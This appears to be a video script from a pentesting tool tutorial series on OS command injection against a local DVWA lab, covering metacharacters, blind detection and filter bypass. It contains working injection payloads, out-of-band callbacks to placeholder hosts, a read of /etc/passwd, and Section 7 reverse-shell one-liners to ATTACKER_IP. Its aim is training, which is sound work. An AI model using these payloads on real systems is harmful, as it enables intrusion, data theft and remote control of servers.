# VIDEO 31: Command Injection
### OS Command Injection, Blind Detection & Filter Bypass
**Suggested length:** 14–18 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Web Application Attacks | CEH: Web Application Hacking

---

> ⚠️ **SAFETY WARNING:** All demonstrations in this video use DVWA (Damn Vulnerable Web Application) running locally in an isolated lab environment. Command injection attacks against systems without explicit written authorization is illegal and unethical. Never use these techniques outside of authorized penetration tests or dedicated practice labs.

---

## INTRO (0:00 – 1:30)

**[Screen: Huginn splash screen with Section 5 title card "Web Application Exploitation"]**

> "Welcome back to the Huginn tutorial series. In this video we're covering command injection — one of the most dangerous web application vulnerabilities you'll encounter. Command injection occurs when a web application passes user-supplied input directly to an operating system command without proper sanitization. If you can inject additional commands, you effectively have a shell on the server."

**[Screen: Slide showing OWASP Top 10 with "A03:2021 – Injection" highlighted, command injection as a sub-category]**

> "Command injection sits under the OWASP Injection category alongside SQL injection, but the impact is often more severe. With SQL injection you're limited to database operations. With command injection, you have direct access to the underlying operating system — you can read files, establish reverse shells, pivot to other hosts, and fully compromise the server. We'll demonstrate this against DVWA's Command Injection module, starting at Security Level Low and escalating to Medium to show filter bypass techniques. If you haven't seen Video 28 on SQL Injection, that covers the general injection methodology we build on here (see Video 28: SQL Injection)."

---

## SECTION 1: Command Injection Fundamentals (1:30 – 3:30)

**[Screen: Diagram showing web application architecture — browser → web server → system() call → OS command execution]**

> "Let's understand how command injection works at a technical level. Many web applications need to interact with the operating system — pinging a host, converting a file, running a system utility. Developers implement this by passing user input into functions like PHP's system(), exec(), shell_exec(), or passthru(). In Python it's os.system() or subprocess with shell=True. In Node.js it's child_process.exec(). The vulnerability occurs when user input flows into these functions without sanitization."

**[Screen: Code comparison showing vulnerable vs secure implementation]**

> "Here's the classic vulnerable pattern. The application takes an IP address from the user and passes it to the ping command: system('ping -c 4 ' + user_input). If I enter a legitimate IP like 8.8.8.8, it runs 'ping -c 4 8.8.8.8' — perfectly fine. But if I enter '8.8.8.8; whoami', the shell interprets the semicolon as a command separator and executes both 'ping -c 4 8.8.8.8' AND 'whoami'. That's command injection."

**[Screen: Table showing shell metacharacters — semicolons, pipes, ampersands, backticks, dollar-parens]**

> "Multiple shell metacharacters can chain commands. A semicolon separates sequential commands. A pipe sends the output of one command as input to the next. Double ampersand runs the second command only if the first succeeds. A single ampersand backgrounds the first command and runs both. Backticks and dollar-parentheses perform command substitution — they execute the inner command first and insert its output. Each of these is a potential injection vector."

```
;       Command separator (sequential execution)
|       Pipe (output to next command)
&&      AND (execute if previous succeeds)
||      OR (execute if previous fails)
&       Background first, run both
`cmd`   Command substitution (backticks)
$(cmd)  Command substitution (dollar-parens)
```

---

## SECTION 2: Huginn Command Injection Interface (3:30 – 5:30)

**[Screen: Huginn application — navigating from Home to Web Exploits → Command Injection module]**

> "Open Huginn and navigate to the Web Exploits page. You'll find the Command Injection tester in the injection testing section. Huginn's CommandInjectionTester class automates the detection process — it identifies form fields that might accept command input, then tests a series of payloads looking for indicators of successful execution."

**[Screen: Command Injection interface showing target URL input, parameter detection, and payload selection panels]**

> "The interface has three main areas. On the left, you configure the target URL. In the center, Huginn shows discovered parameters it considers command-injection candidates — it looks for field names containing keywords like 'cmd', 'command', 'exec', 'system', 'ping', or 'host'. On the right, you'll see the results panel showing any confirmed vulnerabilities with their severity ratings."

**[Screen: Payload configuration panel showing available injection operators — semicolons, pipes, ampersands, backticks, dollar-parens]**

> "The payload configuration lets you select which injection operators to test. By default, Huginn tests semicolons, pipes, double ampersands, backticks, and dollar-parentheses substitution. Each payload uses a safe indicator string — 'CMDINJECTION_TEST' echoed back — to confirm execution without causing damage. It also checks for common output patterns like 'uid=' from the id command or known service account names like www-data and apache."

---

## SECTION 3: DVWA Setup — Security Level Low (5:30 – 7:00)

**[Screen: Browser showing DVWA login page → logging in with admin/password]**

> "Let's set up our target. Open DVWA in your browser — if you're following along, you should have DVWA running locally. Log in with the default credentials: admin / password. Navigate to DVWA Security in the left menu and confirm the security level is set to Low."

```
Target: http://localhost/dvwa/
Credentials: admin / password
Security Level: Low
Module: Command Injection
```

**[Screen: DVWA Security page showing "Low" selected → navigating to Command Injection module]**

> "At Security Level Low, DVWA performs zero input validation on the command injection module. Whatever you type goes directly into a shell_exec() call prepended to 'ping -c 4'. This gives us a clean environment to understand the basic attack before we add filter bypass complexity. Navigate to the Command Injection module from the left sidebar."

**[Screen: DVWA Command Injection page — showing a text input labeled "Enter an IP address" with a Submit button]**

> "Here's the interface. A simple form with one text field asking for an IP address and a Submit button. Behind the scenes, the PHP code takes our input and runs: shell_exec('ping -c 4 ' . our_input). Let's first confirm normal functionality by entering a valid IP."

---

## SECTION 4: Basic Command Injection — Low Security (7:00 – 10:00)

**[Screen: Typing "127.0.0.1" into DVWA input field → clicking Submit → showing ping output]**

> "Enter 127.0.0.1 and click Submit. We see the normal ping output — four ICMP packets sent and received. The application is working as intended. Now let's inject a command."

```bash
# Normal usage - ping localhost
Input: 127.0.0.1

# Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.027 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.020 ms
```

**[Screen: Typing "127.0.0.1; whoami" into the input field → clicking Submit]**

> "Now type '127.0.0.1; whoami'. The semicolon tells the shell to run the ping command, then run whoami as a separate command. Watch the output."

```bash
# Semicolon injection
Input: 127.0.0.1; whoami

# Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
...
www-data
```

**[Screen: Output showing ping results followed by "www-data" — highlighting the injected command output]**

> "There it is. After the ping output, we see 'www-data' — that's the web server's service account. We've confirmed command injection. The application executed our injected whoami command. Let's try other operators."

**[Screen: Testing pipe operator — "127.0.0.1 | id"]**

> "Try the pipe operator: '127.0.0.1 | id'. The pipe sends ping's output as input to the id command, but more importantly, the id command executes."

```bash
# Pipe injection
Input: 127.0.0.1 | id

# Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**[Screen: Testing ampersand — "127.0.0.1 && cat /etc/passwd"]**

> "Double ampersand: '127.0.0.1 && cat /etc/passwd'. This runs cat only if ping succeeds. We get the full passwd file — confirming we can read arbitrary system files."

```bash
# AND operator injection
Input: 127.0.0.1 && cat /etc/passwd

# Output:
PING 127.0.0.1 ...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

**[Screen: Huginn automated scan results showing "CRITICAL: Command Injection" with detected payloads]**

> "Now let's see how Huginn automates this. Point the Command Injection tester at the DVWA URL. Huginn identifies the 'ip' form field, tests each payload sequentially, and confirms the vulnerability. It reports severity as CRITICAL — which is accurate. Any command injection is an immediate path to full system compromise."

---

## SECTION 5: Blind Command Injection Detection (10:00 – 12:00)

**[Screen: Slide explaining blind vs standard command injection — "No direct output visible"]**

> "Not all command injection gives you visible output. In blind command injection, the application executes your command but doesn't display the result. The page might just say 'Ping complete' without showing the actual output. You need detection techniques that don't rely on seeing the command's response."

**[Screen: Demonstrating time-based blind detection — "127.0.0.1; sleep 5"]**

> "The most reliable blind detection method is time-based. Inject a sleep command and measure the response time. Enter '127.0.0.1; sleep 5'. If the response takes approximately 5 seconds longer than normal, command injection is confirmed — the server executed your sleep command."

```bash
# Time-based blind detection
Input: 127.0.0.1; sleep 5

# Normal response time: ~4 seconds (4 ping packets)
# Injected response time: ~9 seconds (4 pings + 5 second sleep)
# Delta: +5 seconds = confirmed blind command injection
```

**[Screen: Demonstrating out-of-band detection — DNS/HTTP callback concept diagram]**

> "Another technique is out-of-band detection. You inject a command that makes the server reach out to infrastructure you control — a DNS lookup to your domain, or an HTTP request to your listener. If you receive the callback, injection is confirmed. For example: '127.0.0.1; nslookup attacker-domain.com' or '127.0.0.1; curl http://your-listener:8080/proof'. In a real engagement, you'd use a Burp Collaborator-style callback server."

```bash
# Out-of-band detection via DNS
Input: 127.0.0.1; nslookup $(whoami).your-callback-server.com

# Out-of-band detection via HTTP
Input: 127.0.0.1; curl http://your-listener:8080/$(whoami)

# If your callback server receives a request, injection is confirmed
```

**[Screen: Demonstrating file-write detection — "127.0.0.1; echo PROOF > /tmp/proof.txt"]**

> "A third technique when you have file read access elsewhere in the application: inject a command that writes to a known location, then use another vulnerability — like path traversal — to read the file and confirm it was created. These techniques stack together in real engagements."

---

## SECTION 6: Filter Bypass — Medium Security (12:00 – 15:00)

**[Screen: DVWA Security page — changing from Low to Medium → navigating back to Command Injection]**

> "Now let's escalate the difficulty. Go to DVWA Security and change the level to Medium. This simulates a developer who's aware of command injection and has implemented basic filtering — but hasn't done it correctly."

**[Screen: Testing "127.0.0.1; whoami" at Medium level — showing it no longer works]**

> "Try our previous payload: '127.0.0.1; whoami'. This time, only the ping output appears — our semicolon injection was blocked. The Medium security level strips certain characters from input. Let's figure out what's filtered and what still works."

```bash
# Blocked at Medium security:
Input: 127.0.0.1; whoami     → BLOCKED (semicolons stripped)
Input: 127.0.0.1 && whoami   → BLOCKED (&& stripped)
```

**[Screen: Testing alternative operators — pipe and OR]**

> "DVWA Medium strips semicolons and double ampersands. But it doesn't strip everything. Try the pipe: '127.0.0.1 | whoami'. Check if single ampersand works differently than double."

```bash
# Bypass with pipe operator:
Input: 127.0.0.1 | whoami

# Output:
www-data

# Pipe works! The filter only removes ; and &&
```

**[Screen: Showing successful injection with pipe operator — output shows "www-data"]**

> "The pipe operator works. DVWA Medium only blacklists semicolons and double ampersands — a classic incomplete filter. This demonstrates why blacklist-based filtering is fundamentally flawed. You can't enumerate every possible dangerous character. The secure approach is input validation — only accept characters that are valid for an IP address: digits, dots, and colons for IPv6."

**[Screen: Testing additional bypasses — newline encoding, background operator]**

> "Other bypass techniques include the OR operator — double pipe — which executes the second command if the first fails. Try '|| whoami' by itself with no valid IP — or use the background operator: '127.0.0.1 & whoami' with a single ampersand."

```bash
# OR operator bypass:
Input: || whoami

# Output:
www-data

# Background operator bypass:
Input: 127.0.0.1 & whoami

# Output:
www-data
PING 127.0.0.1 ...
```

**[Screen: Huginn scan results against Medium DVWA — showing filter bypass payloads that succeeded]**

> "Huginn's command injection tester cycles through all operator types. Against Medium security, it identifies that pipe and background operators bypass the filter while semicolons and double ampersands are blocked. The report clearly shows which payloads succeeded and which were filtered — giving you a map of the application's defenses."

---

## SECTION 7: Post-Exploitation via Command Injection (15:00 – 16:30)

**[Screen: Slide showing exploitation chain — command injection → reverse shell → full compromise]**

> "Once you've confirmed command injection, the next step in a real engagement is establishing persistent access. The most common technique is spawning a reverse shell. Here's what that looks like conceptually — remember, this is for authorized testing in lab environments only."

```bash
# Reverse shell payload examples (LAB USE ONLY):
# Bash reverse shell:
127.0.0.1 | bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell:
127.0.0.1 | python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Netcat reverse shell:
127.0.0.1 | nc ATTACKER_IP 4444 -e /bin/bash
```

> "In Huginn's workflow, command injection findings feed into the exploitation pipeline. You can right-click a confirmed command injection finding and select 'Generate Reverse Shell' which opens the Runecraft payload builder pre-configured with the target parameters. For OSCP, demonstrating the full chain from injection to shell is expected."

---

## SECTION 8: Certification Mapping and Practice (16:30 – 17:30)

**[Screen: Slide showing OSCP mapping — "Web Application Attacks: Command Injection" and CEH — "Module 14: Hacking Web Applications"]**

> "Command injection maps to the OSCP Web Application Attacks domain. On the exam, you'll encounter applications that pass user input to system commands — the methodology is the same: identify the injection point, determine which operators work, and escalate to a shell. For CEH, this falls under Module 14 — Hacking Web Applications — covering OS command injection and code injection techniques."

**[Screen: Practice resources — DVWA (all security levels), THM rooms, HTB machines]**

> "For practice, work through DVWA at all security levels — Low, Medium, and High each teach different bypass techniques. High level filters everything except one edge case. TryHackMe has the 'Command Injection' room for guided learning, and Hack The Box machines like 'Bashed' and 'Shocker' feature command injection in their attack paths. Practice until you can identify injection points and escalate to shells within minutes."

---

## OUTRO (17:30 – end)

**[Screen: Summary slide — Command Injection: Operators (;|&&`$()), Blind Detection (sleep/OOB), Filter Bypass (alternative operators) | Next: Video 32 — Path Traversal]**

> "That's command injection in Huginn. We covered the fundamentals of shell metacharacter injection, walked through basic exploitation at Low security, learned blind detection techniques for applications that don't return output, and demonstrated filter bypass against DVWA's Medium security blacklist. In the next video, we'll cover path traversal and local file inclusion — reading arbitrary files from the server through directory traversal attacks. See you there."
